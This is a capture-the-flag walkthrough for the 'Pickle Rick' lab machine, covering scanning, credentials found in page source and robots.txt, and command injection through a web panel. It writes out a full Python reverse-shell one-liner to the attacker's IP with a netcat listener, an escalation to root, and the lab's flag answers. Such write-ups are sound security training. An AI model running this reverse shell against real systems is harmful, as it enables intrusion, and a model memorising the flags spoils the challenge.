Pickle Rick

A Rick and Morty CTF. Help turn Rick back into a human!

Machine IP address:
```
10.10.159.244
```
We start our investigation by performing a nmap scan:
```
nmap -A -T4 10.10.159.244
```
in the results we can see that there are multiple ports open, related to different services including:
- `22 - ssh`
- `80 - http`

We go and check what is available at the http port via our browser by navigating to:
```
http://10.10.159.244:80
```
or just:
```
10.10.159.244
```
We get the following webpage:
![[Pasted image 20250214191937.png]]

When we go check the page source, we see the username left as a comment:
```
R1ckRul3s
```
When we try to brute-force the password using "Hydra", we get an error that the host machine doesn't support password authentication.

When we try to find some hidden paths via the '/robots.txt' file we get a not-real path:
```
Wubbalubbadubdub
```
We then proceed by trying to find some other directories using "dirbuster". Within the results we find a login page at:
```
/login.php
```
We know we have a username. Do we have a password? Let's try the one we found earlier. We successfully logged in using the credentials:
```
Username: R1ckRul3s
Password: Wubbalubbadubdub
```
We have reached "Rick Portal". We have some section, only available to the real rick, and a command panel.
In the panel's source code we see a suspicious comment:
```
Vm1wR1UxTnRWa2RUV0d4VFlrZFNjRlV3V2t0alJsWnlWbXQwVkUxV1duaFZNakExVkcxS1NHVkliRmhoTVhCb1ZsWmFWMVpWTVVWaGVqQT0==
```
We base64-decode it several times to reveal it's a rabbit hole.
We proceed by trying to execute some commands:
```
ls -la
```
![[Pasted image 20250216115838.png]]
We tried to use the 'cat' command but it's disabled.
Instead, we try to navigate to the path in the browser:
```
http://10.10.159.244/Sup3rS3cretPickl3Ingred.txt
```
Gives us:
```
mr. meeseek hair
```
Looking at the clue.txt path tells us to look around the file system for the other ingredient. After some looking around we found this path:
```
/home/rick/second ingredients
```
We don't see a way to get it with some of the commands disabled.
Using the command:
```
python3 -c "print('hello')"
```
We see we have Python3 enabled. Let's try to get a reverse shell using python. We take a prepared command:
```
python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.0.0.1",1234));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'
```
and we modify it to fit our settings:
```
python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.9.4.102",9999));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'
```
where '10.9.4.102' is our own IP address, and port 9999 is a port number of our choosing to communicate over.
On our side, we initiate listening on port 9999 using netcat:
```
nc -lnvp 9999
```
Now we execute the shell command in the command panel, and we get the shell:
![[Pasted image 20250216123121.png]]

We still can't access:
```
/home/rick/second ingredients
```
So we tried getting root privileges using:
```
sudo bash
```
and we succeed! Now using (after traversing into the relevant path):
```
cat "second ingredients"
```
We can read the second ingredient:
```
1 jerry tear
```
Since we are the root, we might as well check what inside it's home directory:
```
cd /home/root
ls
```
and we see:
```
3rd.txt
```
using 'cat' we get:
```
fleeb juice
```
